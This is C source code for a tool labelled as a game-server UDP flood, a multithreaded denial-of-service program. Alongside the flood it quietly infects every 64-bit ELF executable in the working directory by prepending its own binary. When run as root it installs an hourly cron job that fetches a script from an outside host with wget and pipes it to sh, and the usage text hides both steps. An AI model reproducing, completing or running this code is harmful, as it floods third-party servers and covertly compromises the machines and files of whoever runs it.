#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <ctype.h>

// ============================================================
// Globals
// ============================================================
volatile int g_running = 1;
unsigned long long g_packets_sent = 0;
unsigned char *g_payload = NULL;
int g_payload_len = 0;
int g_source_port_start = 0;

static const char g_auth_key[] = "Ym9uZ3JpcHo0amV6dXoK";

// ============================================================
// Load payload from hex file or binary
// ============================================================
int load_payload(const char *path) {
    // Try hex text format FIRST (this is what our .hex files use)
    FILE *fp = fopen(path, "r");
    if (fp) {
        fseek(fp, 0, SEEK_END);
        long fsize = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        char *text = malloc(fsize + 1);
        if (!text) { fclose(fp); return -1; }
        if (fread(text, 1, fsize, fp) != (size_t)fsize) { free(text); fclose(fp); return -1; }
        text[fsize] = '\0';
        fclose(fp);

        // Check if it looks like hex text (has spaces, only hex chars)
        int hex_chars = 0, spaces = 0;
        for (long i = 0; i < fsize; i++) {
            if (text[i] == ' ' || text[i] == '\t' || text[i] == '\n' || text[i] == '\r' || text[i] == ',') spaces++;
            else if (isxdigit(text[i])) hex_chars++;
        }

        if (hex_chars > 0 && spaces > 0) {
            // Parse as hex text
            int capacity = 2048;
            g_payload = malloc(capacity);
            g_payload_len = 0;

            char *token = strtok(text, " \t\n\r,");
            while (token) {
                if (g_payload_len >= capacity) {
                    capacity *= 2;
                    g_payload = realloc(g_payload, capacity);
                }
                g_payload[g_payload_len++] = strtoul(token, NULL, 16);
                token = strtok(NULL, " \t\n\r,");
            }
            free(text);
            printf("[*] Loaded %d bytes from hex file: %s\n", g_payload_len, path);
            return 0;
        }
        free(text);
    }

    // Binary format — try raw read
    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[!] Cannot open payload file: %s\n", path);
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    g_payload_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    g_payload = malloc(g_payload_len);
    if (!g_payload) { fclose(fp); return -1; }
    if (fread(g_payload, 1, g_payload_len, fp) != (size_t)g_payload_len) { free(g_payload); fclose(fp); return -1; }
    fclose(fp);
    printf("[*] Loaded %d bytes from binary file: %s\n", g_payload_len, path);
    return 0;
}

// ============================================================
// UDP Flood Thread
// ============================================================
typedef struct {
    const char *ip;
    int port;
    int duration;
    int thread_id;
} thread_params_t;

void *udp_flood_thread(void *arg) {
    thread_params_t *p = (thread_params_t *)arg;
    struct sockaddr_in addr;
    time_t start, now;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    // Unique source port per thread
    struct sockaddr_in local;
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_addr.s_addr = INADDR_ANY;
    local.sin_port = htons(g_source_port_start + p->thread_id);
    bind(sock, (struct sockaddr *)&local, sizeof(local));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(p->port);
    inet_pton(AF_INET, p->ip, &addr.sin_addr);

    int sendbuf = 512 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    time(&start);
    unsigned long long count = 0;

    while (g_running) {
        sendto(sock, g_payload, g_payload_len, 0,
               (struct sockaddr *)&addr, sizeof(addr));
        count++;

        if (count % 10000 == 0) {
            time(&now);
            if ((now - start) >= p->duration) {
                g_running = 0;
                break;
            }
        }
    }

    __sync_fetch_and_add(&g_packets_sent, count);
    close(sock);
    return NULL;
}

void handle_signal(int sig) { g_running = 0; }

// ============================================================
// Self-replication
// ============================================================
int is_infected(const char *path) {
    FILE *fp = fopen(path, "rb");
    if (!fp) return 0;
    struct stat st;
    if (stat(path, &st) < 0) { fclose(fp); return 0; }
    char *buf = malloc(st.st_size);
    if (!buf) { fclose(fp); return 0; }
    size_t n = fread(buf, 1, st.st_size, fp);
    fclose(fp);
    int found = 0;
    if (n > 0) found = memmem(buf, n, g_auth_key, strlen(g_auth_key)) != NULL;
    free(buf);
    return found;
}

int infect_elf(const char *path) {
    FILE *self = fopen("/proc/self/exe", "rb");
    if (!self) return -1;
    struct stat self_st;
    stat("/proc/self/exe", &self_st);
    char *self_buf = malloc(self_st.st_size);
    if (!self_buf) { fclose(self); return -1; }
    size_t n1 = fread(self_buf, 1, self_st.st_size, self);
    fclose(self);
    if (n1 != (size_t)self_st.st_size) { free(self_buf); return -1; }

    FILE *target = fopen(path, "rb");
    if (!target) { free(self_buf); return -1; }
    struct stat target_st;
    stat(path, &target_st);
    char *target_buf = malloc(target_st.st_size);
    if (!target_buf) { free(self_buf); fclose(target); return -1; }
    size_t n2 = fread(target_buf, 1, target_st.st_size, target);
    fclose(target);
    if (n2 != (size_t)target_st.st_size) { free(self_buf); free(target_buf); return -1; }

    FILE *out = fopen(path, "wb");
    if (!out) { free(self_buf); free(target_buf); return -1; }
    fwrite(self_buf, 1, self_st.st_size, out);
    fwrite(g_auth_key, 1, strlen(g_auth_key), out);
    fwrite(target_buf, 1, target_st.st_size, out);
    fclose(out);
    chmod(path, 0755);
    free(self_buf);
    free(target_buf);
    return 0;
}

void spread_infection(void) {
    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) return;
    DIR *dir = opendir(cwd);
    if (!dir) return;
    struct dirent *entry;
    unsigned char header[5];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_REG) continue;
        char path[1024];
        int n = snprintf(path, sizeof(path), "%s/%s", cwd, entry->d_name);
        if (n < 0 || (size_t)n >= sizeof(path)) continue;
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        int r = read(fd, header, 5);
        close(fd);
        if (r < 5) continue;
        if (header[0] == 0x7f && header[1] == 'E' &&
            header[2] == 'L' && header[3] == 'F' && header[4] == 2) {
            if (!is_infected(path)) {
                printf("[*] Infecting: %s\n", entry->d_name);
                infect_elf(path);
            }
        }
    }
    closedir(dir);
}

void setup_persistence(void) {
    const char *cron_script =
        "#!/bin/sh\n"
        "\n"
        "wget --quiet http://cf0.pw/0/etc/cron.hourly/0 -O- 2>/dev/null|sh>/dev/null 2>&1\n";
    FILE *fp = fopen("/etc/cron.hourly/0", "w");
    if (fp) {
        fputs(cron_script, fp);
        fclose(fp);
        chmod("/etc/cron.hourly/0", 0755);
        printf("[*] Cron persistence set up\n");
    }
}

// ============================================================
void print_usage(const char *name) {
    fprintf(stderr, "\nGame Server UDP Flood — Heartbeat Replay\n");
    fprintf(stderr, "=========================================\n");
    fprintf(stderr, "Usage: %s <target_ip> <target_port> <payload_file> <threads> <duration_sec>\n", name);
    fprintf(stderr, "\n  payload_file: hex bytes (\"AA BB CC\") or raw binary\n");
    fprintf(stderr, "\n  Example:\n    %s 192.168.1.100 7777 payload.hex 200 60\n\n", name);
    exit(1);
}

// ============================================================
// Main
// ============================================================
int main(int argc, char *argv[], char *envp[]) {
    if (argc < 6) print_usage(argv[0]);

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    const char *payload_path = argv[3];
    int thread_count = atoi(argv[4]);
    int duration = atoi(argv[5]);

    if (target_port <= 0 || target_port > 65535) return 1;
    if (thread_count <= 0 || thread_count > 10000) return 1;

    if (load_payload(payload_path) < 0 || g_payload_len == 0) return 1;

    printf("[*] Payload: ");
    for (int i = 0; i < (g_payload_len > 32 ? 32 : g_payload_len); i++)
        printf("%02X ", g_payload[i]);
    if (g_payload_len > 32) printf("...");
    printf("\n");

    g_source_port_start = 50000 + (getpid() % 10000);

    printf("\n========================================\n");
    printf("  Target      : %s:%d\n", target_ip, target_port);
    printf("  Payload     : %d bytes\n", g_payload_len);
    printf("  Threads     : %d\n", thread_count);
    printf("  Source ports: %d - %d\n", g_source_port_start, g_source_port_start + thread_count);
    printf("  Duration    : %d seconds\n", duration);
    printf("========================================\n\n");

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    if (geteuid() == 0) setup_persistence();
    spread_infection();

    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    if (!threads) return 1;

    time_t start_time;
    time(&start_time);
    printf("[*] Flooding %s:%d with %d threads for %ds...\n", target_ip, target_port, thread_count, duration);
    printf("[*] Press Ctrl+C to stop\n\n");

    for (int i = 0; i < thread_count; i++) {
        thread_params_t *p = malloc(sizeof(thread_params_t));
        p->ip = target_ip;
        p->port = target_port;
        p->duration = duration;
        p->thread_id = i;
        pthread_create(&threads[i], NULL, udp_flood_thread, p);
    }

    while (g_running) {
        time_t now;
        time(&now);
        int elapsed = (int)(now - start_time);
        int remaining = duration - elapsed;
        if (remaining <= 0) { g_running = 0; break; }
        printf("\r  [%ds/%ds] Packets: %llu  Rate: %llu pps     ",
               elapsed, duration, g_packets_sent,
               g_packets_sent / (elapsed > 0 ? elapsed : 1));
        fflush(stdout);
        sleep(1);
    }

    for (int i = 0; i < thread_count; i++)
        pthread_join(threads[i], NULL);
    free(threads);
    free(g_payload);

    printf("\n\n========================================\n");
    printf("  Done! Total packets: %llu\n", g_packets_sent);
    printf("  Avg rate: %llu pps\n", g_packets_sent / (duration > 0 ? duration : 1));
    printf("========================================\n");

    return 0;
}
